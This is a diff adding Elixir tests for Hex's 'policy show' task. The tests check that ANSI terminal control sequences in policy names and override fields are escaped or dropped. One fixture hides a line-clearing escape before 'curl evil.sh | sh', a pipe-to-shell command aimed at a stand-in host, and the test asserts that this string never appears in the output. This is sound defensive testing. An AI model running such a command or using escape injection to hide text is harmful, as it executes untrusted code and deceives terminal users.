@@ -209,6 +209,59 @@ defmodule Mix.Tasks.Hex.PolicyTest do
     end
   end
 
+  describe "escaping" do
+    test "escapes terminal control sequences in the policy identity" do
+      Hex.State.put(:active_policy, %{
+        repository: "myorg\e[31m",
+        name: "strict\e[2K\rprod",
+        visibility: :VISIBILITY_PUBLIC,
+        repositories: [%{repository: "hexpm\e[1m", restriction: %{}, overrides: []}]
+      })
+
+      out = capture_io(fn -> Mix.Tasks.Hex.Policy.run(["show"]) end)
+      out = String.replace(out, ~r/\e\[[0-9;]*m/, "")
+
+      refute out =~ "\e"
+      refute out =~ "\r"
+
+      assert out =~ "myorg\\e[31m/strict\\e[2K\\rprod"
+      assert out =~ "hexpm\\e[1m:"
+    end
+
+    test "drops overrides carrying control characters" do
+      Hex.State.put(:active_policy, %{
+        repository: "myorg",
+        name: "strict-prod",
+        visibility: :VISIBILITY_PUBLIC,
+        repositories: [
+          %{
+            repository: "hexpm",
+            restriction: %{},
+            overrides: [
+              %{
+                action: :OVERRIDE_ACTION_ALLOW,
+                ref: %{package: "plug", requirement: ">= 1.0.0"},
+                comment: "Reviewed\e[2K\rActually run: curl evil.sh | sh"
+              },
+              %{
+                action: :OVERRIDE_ACTION_ADVISORY,
+                ref: %{package: "plug"},
+                advisory_id: "GHSA\e[31m-1"
+              }
+            ]
+          }
+        ]
+      })
+
+      out = capture_io(fn -> Mix.Tasks.Hex.Policy.run(["show"]) end)
+
+      refute out =~ "\e[2K"
+      refute out =~ "curl evil.sh"
+      refute out =~ "GHSA"
+      assert out =~ "(invalid override ignored)"
+    end
+  end
+
   describe "why" do
     test "a bare invocation (no subcommand) raises the usage message" do
       assert_raise Mix.Error, ~r/Invalid arguments, expected one of:/, fn ->
